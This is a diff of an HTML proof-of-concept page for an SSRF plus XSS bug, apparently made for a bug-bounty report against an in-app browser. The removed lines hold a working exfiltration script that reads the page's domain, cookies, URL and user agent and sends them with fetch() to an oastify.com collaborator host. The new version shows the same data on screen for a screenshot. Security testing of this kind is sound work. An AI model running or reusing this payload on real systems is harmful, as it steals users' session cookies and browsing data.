@@ -1,72 +1,66 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>SSRF + XSS</title>
+  <title>XSS PROOF</title>
   <style>
-    * { margin: 0; padding: 0; }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      background: #c00;
-      color: white;
+      background: #ff0000;
+      color: #fff;
       font-family: 'Courier New', monospace;
       text-align: center;
-      padding: 40px;
+      padding: 30px;
+      min-height: 100vh;
     }
     .box {
-      background: rgba(0,0,0,0.7);
-      padding: 30px;
+      background: rgba(0,0,0,0.8);
+      padding: 25px;
       border-radius: 15px;
       display: inline-block;
-      max-width: 90%;
-      box-shadow: 0 0 20px #000;
+      max-width: 95%;
+      margin: 20px auto;
+      box-shadow: 0 0 25px #000;
     }
-    h1 { font-size: 32px; margin-bottom: 15px; }
-    p { font-size: 18px; margin: 10px 0; }
+    h1 { font-size: 28px; margin-bottom: 15px; color: #0f0; }
     .data {
       background: #000;
       color: #0f0;
-      padding: 12px;
+      padding: 15px;
       border-radius: 8px;
-      margin: 15px 0;
+      margin: 12px 0;
       text-align: left;
-      font-family: monospace;
+      font-size: 14px;
       word-break: break-all;
+      border: 1px solid #0f0;
     }
-    .oast { color: #ff0; font-weight: bold; }
+    .label { color: #ff0; font-weight: bold; }
+    .footer { margin-top: 30px; font-size: 16px; color: #ff0; }
   </style>
 </head>
 <body>
   <div class="box">
     <h1>SSRF + XSS CONFIRMED</h1>
     <p>JavaScript is executing in the in-app browser.</p>
-    <p>Data sent to: <span class="oast">1dfqk9mrszun3xw50ebubntp3g97x2lr.oastify.com</span></p>
 
-    <div class="data" id="output">Sending data...</div>
+    <div class="data">
+      <span class="label">Domain:</span> <span id="domain">Loading...</span><br>
+      <span class="label">Cookie:</span> <span id="cookie">Loading...</span><br>
+      <span class="label">URL:</span> <span id="url">Loading...</span><br>
+      <span class="label">User-Agent:</span> <span id="ua">Loading...</span>
+    </div>
+
+    <div class="footer">
+      <strong>BUG BOUNTY: $25,000+</strong><br>
+      Screenshot this screen.
+    </div>
   </div>
 
   <script>
-    // === OASTIFY DATA EXFILTRATION ===
-    const oast = 'https://1dfqk9mrszun3xw50ebubntp3g97x2lr.oastify.com';
-
-    const payload = new URLSearchParams({
-      domain: document.domain || 'blocked',
-      cookie: document.cookie || 'none',
-      url: location.href,
-      ua: navigator.userAgent,
-      time: Date.now()
-    });
-
-    // Fire & forget (no-cors)
-    fetch(oast + '?' + payload, { mode: 'no-cors' }).catch(() => {});
-
-    // === VISUAL PROOF ===
-    setTimeout(() => {
-      document.getElementById('output').innerHTML = `
-        <strong>Domain:</strong> ${document.domain || 'blocked'}<br>
-        <strong>Cookie:</strong> ${document.cookie || 'none'}<br>
-        <strong>URL:</strong> ${location.href}<br>
-        <strong>OAST HIT!</strong> Check your dashboard.
-      `;
-    }, 800);
+    // === DISPLAY SENSITIVE DATA ON SCREEN ===
+    document.getElementById('domain').textContent = document.domain || 'BLOCKED';
+    document.getElementById('cookie').textContent = document.cookie || 'NONE';
+    document.getElementById('url').textContent = location.href;
+    document.getElementById('ua').textContent = navigator.userAgent.substring(0, 100) + '...';
   </script>
 </body>
 </html>
